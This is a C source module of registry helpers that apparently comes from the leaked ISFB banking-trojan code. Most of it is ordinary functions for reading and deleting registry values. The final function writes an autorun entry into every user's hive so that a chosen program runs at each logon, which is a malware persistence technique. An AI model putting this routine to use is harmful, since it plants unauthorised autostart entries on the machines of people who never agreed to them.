//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: reg.c
// $Revision: 436 $
// $Date: 2014-12-09 20:48:40 +0300 (Вт, 09 дек 2014) $
// description:
//	CRM client dll. Registry manipulation functions. 

#include "..\common\common.h"

//
//	Allocates a memory and loads the specified registry value into it.
//
WINERROR LoadRegistryValueW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName,	// value name
	PCHAR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize,		// receives size of the value
	PULONG	pType		// receives type of the value
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hKey = 0;	
	ULONG	Type, Size = 0;
	PCHAR	Value = NULL;

	if ((Status = RegOpenKeyW(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)
	{
		Status = RegQueryValueExW(hKey, ValueName, 0, &Type, NULL, &Size);
		if (Size)
		{
			if (Value = AppAlloc(Size))
			{
				if ((Status = RegQueryValueExW(hKey, ValueName, 0, &Type, Value, &Size)) == NO_ERROR)
				{
					*pValue = Value;
					if (pSize)
						*pSize = Size;
					if (pType)
						*pType = Type;
				}
				else
					AppFree(Value);
			}	// if (Value = AppAlloc(Size))
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;
		}	// if (Size)

		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)

	return(Status);
}

WINERROR LoadRegistryValueA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName,	// value name
	PCHAR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize,		// receives size of the value
	PULONG	pType		// receives type of the value
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hKey = 0;	
	ULONG	Type, Size = 0;
	PCHAR	Value = NULL;

	if ((Status = RegOpenKeyA(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)
	{
		Status = RegQueryValueExA(hKey, ValueName, 0, &Type, NULL, &Size);
		if (Size)
		{
			if (Value = AppAlloc(Size))
			{
				if ((Status = RegQueryValueExA(hKey, ValueName, 0, &Type, Value, &Size)) == NO_ERROR)
				{
					*pValue = Value;
					if (pSize)
						*pSize = Size;
					if (pType)
						*pType = Type;
				}
				else
					AppFree(Value);
			}	// if (Value = AppAlloc(Size))
			else
				Status = ERROR_NOT_ENOUGH_MEMORY;
		}	// if (Size)

		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)

	return(Status);
}

//
//	Reads dword value from registry.
//
WINERROR RegReadDwordW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName,	// value name
	PDWORD	pValue
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hKey = 0;	
	ULONG	Type, Size = sizeof(DWORD);
	DWORD	Value;

	if ((Status = RegOpenKeyW(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)
	{
		Status = RegQueryValueExW(hKey, ValueName, 0, &Type, (LPBYTE)&Value, &Size);
		if (Status == NO_ERROR)
		{
			if ( Type == REG_DWORD && Size == sizeof(DWORD) ){
				*pValue = Value;
			}else{
				Status = ERROR_INVALID_PARAMETER;
			}	
		}	// if (Status == NO_ERROR)

		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)

	return(Status);
}

WINERROR RegReadDwordA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName,	// value name
	PDWORD	pValue
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hKey = 0;	
	ULONG	Type, Size = sizeof(DWORD);
	DWORD	Value;

	if ((Status = RegOpenKeyA(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)
	{
		Status = RegQueryValueExA(hKey, ValueName, 0, &Type, (LPBYTE)&Value, &Size);
		if (Status == NO_ERROR)
		{
			if ( Type == REG_DWORD && Size == sizeof(DWORD) ){
				*pValue = Value;
			}else{
				Status = ERROR_INVALID_PARAMETER;
			}	
		}	// if (Status == NO_ERROR)

		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)

	return(Status);
}

DWORD RegReadStringW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName,	// value name
	LPWSTR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize		// receives size of the value
	)
{
	WINERROR Status;
	ULONG	Type, Size = 0;
	LPWSTR	Value = NULL;
	DWORD i;

	// load value
	Status = 
		LoadRegistryValueW(
			ParentKey,
			KeyName,
			ValueName,
			(PCHAR*)&Value,
			&Size,
			&Type
			);

	if ( Status == NO_ERROR )
	{
		if ( (Size % sizeof(WCHAR)) == 0 && (Type == REG_SZ || Type == REG_EXPAND_SZ)){

			//If the data has the REG_SZ, REG_MULTI_SZ or REG_EXPAND_SZ type, the string may not have been
			//stored with the proper terminating null characters.
			if(Size == 0)
			{
				*Value = 0;
			}
			else
			{
				i = (Size / sizeof(WCHAR)) - 1; //the last symbol's index
				// the last symbol is \0, it means that the size is equal to the symbol's position
				if ( Value[i] == 0 ) {
					Size = i; 
				} else {
					Value[i] = 0;
					Size = i; 
				}
			}

			if(Size > 2 && Type == REG_EXPAND_SZ)
			{
				LPWSTR szExpandValue = StrExpandEnvironmentVariablesW(Value);
				if ( Value != szExpandValue ){
					AppFree ( Value );
				}
				Value = szExpandValue;
			}
		}else{
			Status = ERROR_INVALID_PARAMETER;
		}
	}

	if ( Status == NO_ERROR ){
		*pValue = Value;
		*pSize = Size;
	}else{
		if ( Value ){
			AppFree ( Value );
		}
		*pValue = NULL;
		*pSize = 0;
	}
	return Status;
}

DWORD RegReadStringA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName,	// value name
	PCHAR*	pValue,		// receives pointer the allocated memory containing the specified value
	PULONG	pSize		// receives size of the value
	)
{
	WINERROR Status;
	ULONG	Type, Size = 0;
	LPSTR	Value = NULL;
	DWORD i;

	// load value
	Status = 
		LoadRegistryValueA(
			ParentKey,
			KeyName,
			ValueName,
			&Value,
			&Size,
			&Type
			);

	if ( Status == NO_ERROR )
	{
		if ( (Size % sizeof(CHAR)) == 0 && (Type == REG_SZ || Type == REG_EXPAND_SZ)){

			//If the data has the REG_SZ, REG_MULTI_SZ or REG_EXPAND_SZ type, the string may not have been
			//stored with the proper terminating null characters.
			if(Size == 0)
			{
				*Value = 0;
			}
			else
			{
				i = (Size / sizeof(CHAR)) - 1; //the last symbol's index
				// the last symbol is \0, it means that the size is equal to the symbol's position
				if ( Value[i] == 0 ) {
					Size = i; 
				} else {
					Value[i] = 0;
					Size = i; 
				}
			}

			if(Size > 2 && Type == REG_EXPAND_SZ)
			{
				LPSTR szExpandValue = StrExpandEnvironmentVariablesA(Value);
				if ( Value != szExpandValue ){
					AppFree ( Value );
				}
				Value = szExpandValue;
			}
		}else{
			Status = ERROR_INVALID_PARAMETER;
		}
	}

	if ( Status == NO_ERROR ){
		*pValue = Value;
		*pSize = Size;
	}else{
		if ( Value ){
			AppFree ( Value );
		}
		*pValue = NULL;
		*pSize = 0;
	}
	return Status;
}

//
// deletes single value from key
// 
WINERROR RegDeleteValueExA(
	HKEY	ParentKey,	// parent key name
	LPSTR	KeyName,	// target key name
	LPSTR	ValueName	// value name
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hKey = 0;	

	if ((Status = RegOpenKeyA(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)
	{
		Status = RegDeleteValueA(hKey, ValueName);
		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)

	return(Status);
}

WINERROR RegDeleteValueExW(
	HKEY	ParentKey,	// parent key name
	LPWSTR	KeyName,	// target key name
	LPWSTR	ValueName	// value name
	)
{
	WINERROR Status = NO_ERROR;
	HANDLE	hKey = 0;	

	if ((Status = RegOpenKeyW(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)
	{
		Status = RegDeleteValueW(hKey, ValueName);
		RegCloseKey(hKey);
	}	// if ((Status = RegOpenKey(ParentKey, KeyName, (PHKEY)&hKey)) == NO_ERROR)

	return(Status);
}


//
//	Scans all user registry keys and sets the specified autorun value for each user.
//
WINERROR RegEnumUsersSetAutorun(
	LPTSTR	pName,		// autorun value name
	LPTSTR	pPath,		// path to register
	ULONG	KeyFlags	// key flags
	)
{
	WINERROR Status;
	HKEY hParent, hKey;
	LPTSTR	KeyName[MAX_PATH + cstrlen(szAutoPath)];
	ULONG	Index = 0, Size = MAX_PATH;

	if ((Status = RegOpenKeyEx(HKEY_USERS, NULL, 0, (KeyFlags | KEY_READ), &hParent)) == NO_ERROR)
	{
		Status = ERROR_FILE_NOT_FOUND;
		while(RegEnumKeyEx(hParent, Index, (LPTSTR)&KeyName, &Size, 0, NULL, NULL, NULL) == NO_ERROR)
		{
			if (Size > 8 && !StrChr((LPTSTR)&KeyName, '_'))
			{
				PathCombine((LPTSTR)&KeyName, (LPTSTR)&KeyName, szAutoPath);

				if (RegOpenKeyEx(hParent, (LPTSTR)&KeyName, 0, (KeyFlags | KEY_ALL_ACCESS), &hKey) == NO_ERROR)
				{
					if (RegSetValueEx(hKey, pName, 0, REG_SZ, pPath, (lstrlen(pPath) + 1) * sizeof(_TCHAR)) == NO_ERROR)
						Status = NO_ERROR;
					RegCloseKey(hKey);
				}
			}	// if (Size > 8 && !StrChr(KeyName, '_'))
			Index += 1;
			Size = MAX_PATH;
		}	// while(RegEnumKeyEx(hParent, Index, pKeyName, &Size, 0, NULL, NULL, NULL) == NO_ERROR)

		RegCloseKey(hParent);
	}	// if (RegOpenKeyEx(HKEY_USERS, NULL, 0, (KeyFlags | KEY_READ), &hParent) == NO_ERROR)

	return(Status);
}